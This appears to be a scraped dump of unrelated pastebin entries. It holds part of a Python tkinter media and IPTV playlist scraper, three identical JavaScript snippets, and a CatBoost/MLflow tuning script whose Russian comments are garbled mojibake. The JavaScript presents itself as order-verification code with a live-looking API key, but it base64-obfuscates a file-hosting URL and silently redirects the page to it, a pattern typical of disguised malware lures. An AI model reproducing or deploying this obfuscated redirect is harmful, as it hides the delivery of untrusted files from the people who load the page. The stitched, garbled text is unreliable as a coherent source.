        messagebox.showinfo(""Saved"", f""URLs saved to {file_path}"")

def scrape_normal_site(url):
    found_urls = set()
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            return found_urls
        soup = BeautifulSoup(response.text, 'html.parser')
        for tag in soup.find_all(['img', 'video', 'source', 'a']):
            src = tag.get('src') or tag.get('href')
            if src:
                full_url = urljoin(url, src)
                parsed = urlparse(full_url)
                ext = os.path.splitext(parsed.path)[1].lower()
                if ext in image_exts + video_exts:
                    found_urls.add(full_url)
    except Exception:
        pass
    return found_urls

def process_url():
    url = url_entry.get().strip()
    if not url:
        messagebox.showwarning(""Input Error"", ""Please enter a valid URL."")
        return
    media_urls.clear()
    result_box.delete(""1.0"", tk.END)
    try:
        if is_special_site(url):
            ydl_opts = {
                'quiet': True,
                'skip_download': True,
                'force_generic_extractor': False
            }
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(url, download=False)
                if 'entries' in info:
                    for entry in info['entries']:
                        media_urls.append(entry['webpage_url'])
                        result_box.insert(tk.END, entry['webpage_url'] + ""\n"")
                else:
                    media_urls.append(info['webpage_url'])
                    result_box.insert(tk.END, info['webpage_url'] + ""\n"")
        else:
            scraped = scrape_normal_site(url)
            media_urls.extend(scraped)
            for media_url in scraped:
                result_box.insert(tk.END, media_url + ""\n"")
        if not media_urls:
            messagebox.showinfo(""Info"", ""No media URLs found."")
        else:
            messagebox.showinfo(""Success"", f""{len(media_urls)} media URL(s) found!"")
    except Exception as e:
        messagebox.showerror(""Error"", str(e))

def download_media(url, save_path):
    try:
        if is_special_site(url):
            ytdlp_path = shutil.which(""yt-dlp"") or r""C:\Windows\yt-dlp.exe""
            command = [
                ytdlp_path,
                ""-f"", ""best"",
                ""--no-playlist"",
                ""--extractor-args"", ""youtube:player_client=web"",
                ""-o"", save_path,
                url
            ]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode != 0:
                raise Exception(result.stderr.strip())
        else:
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
    except Exception as e:
        messagebox.showerror(""Download Error"", f""Failed to download:\n{url}\n{str(e)}"")

def download_selected_line():
    try:
        line_index = result_box.index(tk.INSERT).split(""."")[0]
        selected_url = result_box.get(f""{line_index}.0"", f""{line_index}.end"").strip()
        if not selected_url:
            raise Exception(""No line selected."")
        folder = filedialog.askdirectory(title=""Select Folder to Save File"")
        if not folder:
            return
        parsed = urlparse(selected_url)
        filename = os.path.basename(parsed.path)
        if not filename:
            filename = ""downloaded_file""
        save_path = os.path.join(folder, filename)
        threading.Thread(target=threaded_download, args=(selected_url, save_path), daemon=True).start()
    except Exception as e:
        messagebox.showerror(""Error"", str(e))

def download_selected():
    selected_urls = result_box.get(""1.0"", tk.END).strip().splitlines()
    if not selected_urls:
        messagebox.showwarning(""Selection Error"", ""No URLs to download."")
        return
    selected = filedialog.askdirectory(title=""Select Folder to Save Files"")
    if not selected:
        return
    for url in selected_urls:
        parsed = urlparse(url)
        filename = os.path.basename(parsed.path)
        if not filename:
            filename = ""downloaded_file.mp4""
        save_path = os.path.join(selected, filename)
        download_media(url, save_path)
    messagebox.showinfo(""Download Complete"", f""Downloaded {len(selected_urls)} media files."")

def threaded_download(url, save_path):
    global stop_download_flag
    stop_download_flag = False
    try:
        if is_special_site(url):
            ytdlp_path = shutil.which(""yt-dlp"") or r""C:\Windows\yt-dlp.exe""
            command = [
                ytdlp_path,
                ""-f"", ""mp4"",
                ""--no-part"",  # Saves directly as .mp4
                ""--downloader"", ""ffmpeg"",
                ""--downloader-args"", ""ffmpeg_i:-movflags +faststart"",
                ""-o"", save_path,
                url
            ]
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            while proc.poll() is None:
                if stop_download_flag:
                    proc.kill()
                    break
        else:
            response = requests.get(url, stream=True, timeout=10)
            if response.status_code == 200:
                with open(save_path, 'wb') as f:
                    for chunk in response.iter_content(1024 * 1024):  # 1MB
                        if stop_download_flag:
                            break
                        if chunk:
                            f.write(chunk)
        if stop_download_flag:
            fix_partial_video(save_path)  # Try to repair it
            messagebox.showinfo(""Download Stopped"", f""Download was stopped by user.\nSaved: {save_path}"")
        else:
            messagebox.showinfo(""Download Complete"", f""Downloaded successfully to:\n{save_path}"")
    except Exception as e:
        messagebox.showerror(""Download Error"", str(e))

def stop_download():
    global stop_download_flag
    stop_download_flag = True

def fix_partial_video(input_path):
    try:
        if not os.path.exists(input_path) or not input_path.lower().endswith("".mp4""):
            return
        output_path = input_path.replace("".mp4"", ""_fixed.mp4"")
        ffmpeg_path = shutil.which(""ffmpeg"") or r""C:\Program Files\ffmpeg\bin\ffmpeg.exe""
        # Try quick remux
        command = [
            ffmpeg_path,
            ""-y"",
            ""-i"", input_path,
            ""-c"", ""copy"",
            ""-movflags"", ""+faststart"",
            output_path
        ]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Fallback to re-encode if remux fails or small file
        if result.returncode != 0 or not os.path.exists(output_path) or os.path.getsize(output_path) < 1024 * 1024:
            print(""[INFO] Remux failed or file too small, retrying with re-encode..."")
            command = [
                ffmpeg_path,
                ""-y"",
                ""-i"", input_path,
                ""-preset"", ""ultrafast"",
                output_path
            ]
            subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        # Replace original file if fixed
        if os.path.exists(output_path):
            os.remove(input_path)
            os.rename(output_path, input_path)
    except Exception as e:
        print(f""[FFmpeg Fix Error] {e}"")

def scrape_all_links(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        links = []
        for tag in soup.find_all('a', href=True):
            href = tag['href']
            full_url = urljoin(url, href)
            parsed_url = urlparse(full_url)
            if parsed_url.scheme in ['http', 'https']:
                links.append(full_url)
        return links
    except requests.exceptions.RequestException as e:
        messagebox.showerror(""Network Error"", f""Failed to scrape links: {e}"")
        return []
    except Exception as e:
        messagebox.showerror(""Error"", f""An unexpected error occurred: {e}"")
        return []

def scrape_all_button():
    url = url_entry.get().strip()
    if not url:
        messagebox.showwarning(""Input Error"", ""Please enter a valid URL."")
        return
    result_box.delete(""1.0"", tk.END)
    media_urls.clear()
    all_links = scrape_all_links(url)
    media_urls.extend(all_links)
    for link in all_links:
        result_box.insert(tk.END, link + ""\n"")
    messagebox.showinfo(""Done"", f""{len(all_links)} total link(s) scraped."")

def open_in_vlc():
    line_index = result_box.index(tk.INSERT).split(""."")[0]
    selected_url = result_box.get(f""{line_index}.0"", f""{line_index}.end"").strip()
    if not selected_url:
        messagebox.showwarning(""No Selection"", ""Select a valid media URL."")
        return
    #vlc_path = shutil.which(""vlc"")
    vlc_path = r""C:\Program Files\VideoLAN\VLC\vlc.exe""
    if not vlc_path:
        messagebox.showerror(""VLC Error"", ""VLC is not installed or not found in PATH."")
        return
    try:
        subprocess.Popen([vlc_path, selected_url])
    except Exception as e:
        messagebox.showerror(""VLC Error"", f""Could not open VLC: {e}"")

def preview_image_popup():
    try:
        line_index = result_box.index(tk.INSERT).split(""."")[0]
        selected_url = result_box.get(f""{line_index}.0"", f""{line_index}.end"").strip()
        if not selected_url.lower().endswith(tuple(image_exts)):
            messagebox.showerror(""Preview Error"", ""Selected link is not an image."")
            return
        response = requests.get(selected_url, timeout=10)
        if response.status_code != 200:
            messagebox.showerror(""Preview Error"", ""Failed to load image."")
            return
        image = Image.open(io.BytesIO(response.content))
        popup = tk.Toplevel(window)
        popup.title(""Image Preview"")
        popup.geometry(""600x600"")
        img_resized = image.resize((500, 500), Image.ANTIALIAS)
        img_tk = ImageTk.PhotoImage(img_resized)
        label = tk.Label(popup, image=img_tk)
        label.image = img_tk
        label.pack()
    except Exception as e:
        messagebox.showerror(""Preview Error"", str(e))

def load_m3u_file():
    file_path = filedialog.askopenfilename(title=""Open M3U File"", filetypes=[(""M3U/M3U8 Files"", ""*.m3u *.m3u8"")])
    if file_path:
        result_box.delete(""1.0"", tk.END)
        media_urls.clear()
        with open(file_path, 'r', encoding=""utf-8"", errors=""ignore"") as f:
            for line in f:
                url = line.strip()
                if url and url.startswith(""http""):
                    media_urls.append(url)
                    result_box.insert(tk.END, url + ""\n"")
        messagebox.showinfo(""Loaded"", f""{len(media_urls)} media URLs loaded from playlist."")

def load_online_m3u():
    url = url_entry.get().strip()
    if not url.lower().endswith(("".m3u"", "".m3u8"")):
        messagebox.showwarning(""URL Error"", ""Please enter a valid .m3u or .m3u8 URL."")
        return
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            raise Exception(""Unable to fetch playlist."")
        result_box.delete(""1.0"", tk.END)
        media_urls.clear()
        for line in response.text.splitlines():
            line = line.strip()
            if line and line.startswith(""http""):
                media_urls.append(line)
                result_box.insert(tk.END, line + ""\n"")
        messagebox.showinfo(""Online M3U Loaded"", f""{len(media_urls)} stream(s) loaded."")
    except Exception as e:
        messagebox.showerror(""Error"", str(e))

def scrape_xtream_m3u_url():
    url = url_entry.get().strip()
    if not url or ""get.php"" not in url:
        messagebox.showwarning(""Input Error"", ""Please enter a valid Xtream M3U URL."")
        return
    try:
        headers = {
            ""User-Agent"": ""VLC/3.0.18 LibVLC/3.0.18""
        }
        response = requests.get(url, headers=headers, timeout=15)
        if response.status_code == 404:
            raise Exception(""404 Not Found ‚Äî the playlist URL might be wrong or expired."")
        if response.status_code != 200:
            raise Exception(f""Failed to fetch playlist. Status code: {response.status_code}"")
        content = response.text
        if ""#EXTM3U"" not in content:
            raise Exception(""Invalid playlist. No M3U content found."")
        result_box.delete(""1.0"", tk.END)
        media_urls.clear()
        for line in content.splitlines():
            if line.startswith(""http""):
                media_urls.append(line)
                result_box.insert(tk.END, line + ""\n"")
        if media_urls:
            messagebox.showinfo(""Success"", f""Scraped {len(media_urls)} stream URLs from Xtream playlist."")
        else:
            messagebox.showwarning(""No URLs"", ""Playlist loaded, but no stream URLs found."")
    except Exception as e:
        messagebox.showerror(""Error"", str(e))

def search_urls():
    query = search_entry.get().strip().lower()
    if not query:
        return
    result_box.tag_remove(""highlight"", ""1.0"", tk.END)
    lines = result_box.get(""1.0"", tk.END).splitlines()
    for i, line in enumerate(lines, 1):
        if query in line.lower():
            result_box.tag_add(""highlight"", f""{i}.0"", f""{i}.end"")
    result_box.tag_config(""highlight"", background=""yellow"", foreground=""black"")

def save_as_m3u():
    """"""
    Saves the contents of the result box as an M3U/M3U8 playlist file.
    """"""
    file_path = filedialog.asksaveasfilename(
        defaultextension="".m3u"",
        filetypes=[(""Text File"", ""*.txt""), (""M3U Playlist"", ""*.m3u""), (""M3U8 Playlist"", ""*.m3u8"")]
    )
    if file_path:
        try:
            with open(file_path, 'w', encoding=""utf-8"") as f:
                # Write content from the result box to the file
                f.write(result_box.get(""1.0"", tk.END).strip())
            messagebox.showinfo(""Saved"", f""Playlist saved to:\n{file_path}"")
        except Exception as e:
            messagebox.showerror(""Save Error"", f""Failed to save playlist:\n{str(e)}"")

def clear_url_field():
    """"""
    Clears the URL entry field.
    """"""
    url_entry.delete(0, tk.END)

def clear_result_box():
    """"""
    Clears the result box and resets the media URLs list.
    """"""
    result_box.delete(""1.0"", tk.END)
    media_urls.clear()

def clear_search():
    """"""
    Clears the search entry field and removes highlights from the result box.
    """"""
    search_entry.delete(0, tk.END)
    result_box.tag_remove(""highlight"", ""1.0"", tk.END)
    
# Tab 2 Layout
tk.Label(tab2, text=""Enter URL to Scrape Media:"").pack(pady=5)
search_frame = tk.Frame(tab2)
search_frame.pack(pady=5)
search_entry = tk.Entry(search_frame, width=40)
search_entry.pack(side=tk.LEFT, padx=5)
tk.Button(search_frame, text=""Search"", command=search_urls, bg=""lightblue"").pack(side=tk.LEFT, padx=5)
url_entry = tk.Entry(search_frame, width=100)
url_entry.pack(pady=5)

frame_buttons = tk.Frame(tab2)
frame_buttons.pack(pady=5)
tk.Button(frame_buttons, text=""Scrape Media"", command=process_url, bg=""lightgreen"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text=""Browse URL File"", command=browse_url_file, bg=""lightyellow"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text=""Download All URLs"", command=download_selected, bg=""lightblue"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text=""Download Selected URL"", command=download_selected_line, bg=""orange"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text=""Save URLs to File"", command=save_urls_to_file, bg=""lightgray"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text=""Stop Download"", command=stop_download, bg=""red"", width=20).pack(side=tk.LEFT, padx=5)

frame_button = tk.Frame(tab2)
frame_button.pack(pady=5)
tk.Button(frame_button, text=""Scrape All Links"", command=scrape_all_button, bg=""#e0c3fc"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_button, text=""Open in VLC"", command=open_in_vlc, bg=""#c1f0c1"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_button, text=""Preview Image"", command=preview_image_popup, bg=""#f0c1c1"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_button, text=""Load Online M3U"", command=load_online_m3u, bg=""#c9f2ff"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_button, text=""Scrape Xtream M3U"", command=scrape_xtream_m3u_url, bg=""#fff0b3"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_button, text=""Load M3U File"", command=load_m3u_file, bg=""#d0f0fd"", width=20).pack(side=tk.LEFT, padx=5)

result_frame = tk.Frame(tab2)
result_frame.pack(pady=5)
scrollbar = tk.Scrollbar(result_frame)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
result_box = tk.Text(result_frame, height=30, width=124, yscrollcommand=scrollbar.set)
result_box.pack(side=tk.LEFT, fill=tk.BOTH)
scrollbar.config(command=result_box.yview)

frame_clear = tk.Frame(tab2)
frame_clear.pack(pady=5)

tk.Button(frame_clear, text=""Save Result"", command=save_as_m3u, bg=""#a7ffcc"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_clear, text=""Clear Search"", command=clear_search, bg=""lightgray"").pack(side=tk.LEFT, padx=2)
tk.Button(frame_clear, text=""Clear URL Field"", command=clear_url_field, bg=""#ffd580"", width=20).pack(side=tk.LEFT, padx=5)
tk.Button(frame_clear, text=""Clear Result Field"", command=clear_result_box, bg=""#ffb3b3"", width=20).pack(side=tk.LEFT, padx=5)
# ====================
# === Tab 3 Content ===
# ====================
tab3 = ttk.Frame(notebook)
notebook.add(tab3, text=""Web Scraper"")
notebook.pack(expand=True, fill=""both"")

class WebScraperGUI:
    def __init__(self, root):
        self.root = root

        # Configure the style for ttk.Frame
        self.style = ttk.Style()
        self.style.configure(""Background.TFrame"", background=""#336699"")  # Define a custom style
        self.root.config(style=""Background.TFrame"")  # Apply the style to the root frame

        # URL Entry
        self.url_label = ttk.Label(root, text=""Enter URL:"")
        self.url_label.grid(column=0, row=0, sticky=tk.W, padx=10, pady=5)
        self.url_entry = ttk.Entry(root, width=120)
        self.url_entry.grid(column=1, row=0, columnspan=4, sticky=tk.W, padx=10, pady=5)

        # Options
        self.options_label = ttk.Label(root, text=""Select Options:"")
        self.options_label.grid(column=0, row=1, sticky=tk.W, padx=10, pady=5)

        # Checkboxes
        self.check_var_html = tk.BooleanVar()
        self.check_var_heading = tk.BooleanVar()
        self.check_var_paragraph = tk.BooleanVar()
        self.check_var_css = tk.BooleanVar()
        self.check_var_table = tk.BooleanVar()
        self.check_var_links = tk.BooleanVar()
        self.check_var_files = tk.BooleanVar()

        self.html_check = ttk.Checkbutton(root, text=""Full HTML"", variable=self.check_var_html)
        self.html_check.grid(column=1, row=1, sticky=tk.W, padx=10, pady=5)

        self.heading_check = ttk.Checkbutton(root, text=""Headings"", variable=self.check_var_heading)
        self.heading_check.grid(column=2, row=1, sticky=tk.W, padx=10, pady=5)

        self.paragraph_check = ttk.Checkbutton(root, text=""Paragraphs"", variable=self.check_var_paragraph)
        self.paragraph_check.grid(column=3, row=1, sticky=tk.W, padx=10, pady=5)

        self.css_check = ttk.Checkbutton(root, text=""CSS"", variable=self.check_var_css)
        self.css_check.grid(column=4, row=1, sticky=tk.W, padx=10, pady=5)

        self.table_check = ttk.Checkbutton(root, text=""Tables"", variable=self.check_var_table)
        self.table_check.grid(column=1, row=2, sticky=tk.W, padx=10, pady=5)

        self.links_check = ttk.Checkbutton(root, text=""Links"", variable=self.check_var_links)
        self.links_check.grid(column=2, row=2, sticky=tk.W, padx=10, pady=5)

        self.files_check = ttk.Checkbutton(root, text=""Files"", variable=self.check_var_files)
        self.files_check.grid(column=3, row=2, sticky=tk.W, padx=10, pady=5)

        # Result Text Field
        self.result_label = ttk.Label(root, text=""Scraped Content of Websites:"")
        self.result_label.grid(column=0, row=4, sticky=tk.W, padx=10, pady=5)

        #self.result_text = scrolledtext.ScrolledText(root, width=110, height=33, wrap=tk.WORD)
        self.result_text = scrolledtext.ScrolledText(root, width=116, height=33, wrap=tk.WORD, bg=""#f0f0f0"")
        self.result_text.grid(column=0, row=5, columnspan=5)

        # Scrape Button
        self.scrape_button = ttk.Button(root, text=""SCRAPE"", command=self.scrape)
        self.scrape_button.grid(column=4, row=4, columnspan=8, pady=10)

        # Save Result Button
        self.save_result_button = ttk.Button(root, text=""Save Result"", command=self.save_result, style='Red.TButton')
        self.save_result_button.grid(column=2, row=4, columnspan=8, pady=10)

        # Define style for the ""Save Result"" button
        self.style.configure('Red.TButton', foreground='red')

    def scrape(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showwarning(""Input Error"", ""Please enter a valid URL."")
            return

        options = {
            'html': self.check_var_html.get(),
            'heading': self.check_var_heading.get(),
            'paragraph': self.check_var_paragraph.get(),
            'css': self.check_var_css.get(),
            'table': self.check_var_table.get(),
            'links': self.check_var_links.get(),
            'files': self.check_var_files.get()
        }

        try:
            response = requests.get(url)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')

            result = """"
            if options['html']:
                result += str(soup) + '\n\n'

            if options['heading']:
                headings = soup.find_all(re.compile('^h[1-6]$'))
                result += ""Headings:\n""
                for heading in headings:
                    result += heading.text.strip() + '\n'
                result += '\n'

            if options['paragraph']:
                paragraphs = soup.find_all('p')
                result += ""Paragraphs:\n""
                for paragraph in paragraphs:
                    result += paragraph.text.strip() + '\n'
                result += '\n'

            if options['css']:
                css_links = [link['href'] for link in soup.find_all('link', rel='stylesheet')]
                result += ""CSS Links:\n""
                for css_link in css_links:
                    full_url = urljoin(url, css_link)
                    result += full_url + '\n'
                result += '\n'

            if options['table']:
                tables = soup.find_all('table')
                result += ""Tables:\n""
                for table in tables:
                    result += str(table) + '\n'
                result += '\n'

            if options['links']:
                links = soup.find_all('a', href=True)
                result += ""Links:\n""
                for link in links:
                    if link['href'].startswith('http'):
                        result += f""Text: {link.text.strip()}, URL: {link['href']}\n""
                    else:
                        full_url = urljoin(url, link['href'])
                        result += f""Text: {link.text.strip()}, URL: {full_url}\n""
                result += '\n'

            if options['files']:
                file_links = [link['href'] for link in soup.find_all('a', href=True) if re.search(r'\.[^.]+$', link['href'])]
                result += ""File Links:\n""
                for file_link in file_links:
                    full_url = urljoin(url, file_link)
                    result += full_url + '\n'
                result += '\n'

            self.result_text.delete(1.0, tk.END)
            self.result_text.insert(tk.END, result)

        except requests.exceptions.RequestException as e:
            messagebox.showerror(""Network Error"", f""Failed to fetch URL: {e}"")
        except Exception as e:
            messagebox.showerror(""Error"", f""An unexpected error occurred: {e}"")

    def save_result(self):
        result_text = self.result_text.get(1.0, tk.END)
        if not result_text.strip():
            messagebox.showwarning(""Empty Result"", ""No content to save."")
            return

        file_path = filedialog.asksaveasfilename(defaultextension="".txt"", filetypes=[(""Text files"", ""*.txt"")])
        if file_path:
            try:
                with open(file_path, ""w"", encoding=""utf-8"") as file:
                    file.write(result_text)
                messagebox.showinfo(""Success"", f""Result saved to {file_path}"")
            except Exception as e:
                messagebox.showerror(""Save Error"", f""Failed to save file: {e}"")


# Initialize WebScraperGUI in Tab 3
web_scraper_gui = WebScraperGUI(tab3)
# Run
window.mainloop()
"
11wWELXL,Order.js,jm33,JavaScript,Wednesday 16th of April 2025 08:04:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98555/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PBMhqWH2,Market.js,jm33,JavaScript,Wednesday 16th of April 2025 07:49:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33486/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
745KzDnX,Untitled,jm33,JavaScript,Wednesday 16th of April 2025 07:33:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69725/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dzbFgL5D,mlflow,alien_555,Python,Wednesday 16th of April 2025 07:27:59 PM CDT,"RUN_NAME = ""model_bayesian_search""
STUDY_DB_NAME = ""sqlite:///local.study.db""
STUDY_NAME = ""churn_model""


experiment = mlflow.get_experiment_by_name(EXPERIMENT_NAME)
if not experiment:
    experiment_id = mlflow.create_experiment(EXPERIMENT_NAME)
else:
    experiment_id = experiment.experiment_id
    
if mlflow.active_run() is not None:
    mlflow.end_run()


def objective(trial: optuna.Trial) -> float:
    print(""Optimizing..."")
    #–í–ª–æ–∂–µ–Ω–Ω—ã–µ –∑–∞–ø—É—Å–∫–∏
    # with mlflow.start_run(run_id=run_id, nested=True) as nested_run: 
    print(""Start nested_run"")
    
    param = {
        ""learning_rate"": trial.suggest_float(""learning_rate"", 0.001, 0.1, log=True),
        ""depth"": trial.suggest_int(""depth"", 1, 12),
        ""l2_leaf_reg"": trial.suggest_float(""l2_leaf_reg"", 0.1, 5),
        ""random_strength"": trial.suggest_float(""random_strength"", 0.1, 5),
        ""loss_function"": ""Logloss"",
        ""task_type"": ""CPU"",
        ""random_seed"": 0,
        ""iterations"": 300,
        ""verbose"": False,
        ""auto_class_weights"": 'Balanced',
        ""cat_features"": cat_cols,
    }

    model = CatBoostClassifier(**param)

    skf = StratifiedKFold(n_splits=2,
                        shuffle=True,
                        random_state=555)

    metrics = defaultdict(list)
    #  train_index –∏ val_index ‚Äî —ç—Ç–æ –º–∞—Å—Å–∏–≤—ã –∏–Ω–¥–µ–∫—Å–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ —É–∫–∞–∑—ã–≤–∞—é—Ç, –∫–∞–∫–∏–µ —Å—Ç—Ä–æ–∫–∏ –∏–∑ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ DataFrame X_train (–∏–ª–∏ y_train) –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –≤–∫–ª—é—á–µ–Ω—ã –≤ –æ–±—É—á–∞—é—â—É—é –∏ –≤–∞–ª–∏–¥–∞—Ü–∏–æ–Ω–Ω—É—é –≤—ã–±–æ—Ä–∫–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ —Ñ–æ–ª–¥–∞ i, —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.
    for i, (train_index, val_index) in enumerate(skf.split(X_train, y_train)):
        # –†–∞–∑–¥–µ–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ –æ–±—É—á–∞—é—â—É—é –∏ –≤–∞–ª–∏–¥–∞—Ü–∏–æ–Ω–Ω—É—é –≤—ã–±–æ—Ä–∫–∏
        train_x, val_x = X_train.iloc[train_index], X_train.iloc[val_index]
        train_y, val_y = y_train.iloc[train_index], y_train.iloc[val_index]
        
        # –û–±—É—á–∞–µ–º –º–æ–¥–µ–ª—å –Ω–∞ –æ–±—É—á–∞—é—â–µ–π –≤—ã–±–æ—Ä–∫–µ
        model.fit(train_x, train_y, verbose=False) #verbose=False –¥–ª—è —É–º–µ–Ω—å—à–µ–Ω–∏—è –≤—ã–≤–æ–¥–∞

        # –ü–æ–ª—É—á–∞–µ–º –ø—Ä–µ–¥—Å–∫–∞–∑–∞–Ω–∏—è –∏ –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –Ω–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–æ–Ω–Ω–æ–π –≤—ã–±–æ—Ä–∫–µ
        prediction = model.predict(val_x)
        probas = model.predict_proba(val_x)[:, 1]

        # –í—ã—á–∏—Å–ª–µ–Ω–∏–µ –º–µ—Ç—Ä–∏–∫
        # –í—ã—á–∏—Å–ª–µ–Ω–∏–µ confusion matrix —Å –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏–µ–π
        cm = confusion_matrix(val_y, prediction, normalize='all')
        # –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π –∏–∑ –Ω–æ—Ä–º–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–π –º–∞—Ç—Ä–∏—Ü—ã
        TN = cm[0, 0]  # True Negative
        FP = cm[0, 1]  # False Positive (–æ—à–∏–±–∫–∞ –ø–µ—Ä–≤–æ–≥–æ —Ä–æ–¥–∞)
        FN = cm[1, 0]  # False Negative (–æ—à–∏–±–∫–∞ –≤—Ç–æ—Ä–æ–≥–æ —Ä–æ–¥–∞)
        TP = cm[1, 1]  # True Positive
        # err_1 ‚Äî –æ—à–∏–±–∫–∞ –ø–µ—Ä–≤–æ–≥–æ —Ä–æ–¥–∞
        # err_2 ‚Äî –æ—à–∏–±–∫–∞ –≤—Ç–æ—Ä–æ–≥–æ —Ä–æ–¥–∞
        err_1 = FP  # False Positive Rate (–¥–æ–ª—è –æ—Ç –æ–±—â–µ–≥–æ —á–∏—Å–ª–∞)
        err_2 = FN  # False Negative Rate (–¥–æ–ª—è –æ—Ç –æ–±—â–µ–≥–æ —á–∏—Å–ª–∞)
        
        auc = roc_auc_score(val_y, probas)
        precision = precision_score(val_y, prediction)
        recall = recall_score(val_y, prediction)
        f1 = f1_score(val_y, prediction)
        logloss = log_loss(val_y, probas)
        
        metrics[""err1""].append(err_1)
        metrics[""err2""].append(err_2)
        metrics[""auc""].append(auc)
        metrics[""precision""].append(precision)
        metrics[""recall""].append(recall)
        metrics[""f1""].append(f1)
        metrics[""logloss""].append(logloss)

    err_1 = np.median(metrics['err1'])
    err_2 = np.median(metrics['err2'])
    auc = np.median(metrics['auc'])
    precision = np.median(metrics[""precision""])
    recall = np.median(metrics[""recall""])
    f1 = np.median(metrics[""f1""])
    logloss = np.median(metrics[""logloss""])
    
    mlflow.log_metric(""err1"", err_1)
    mlflow.log_metric(""err2"", err_2)
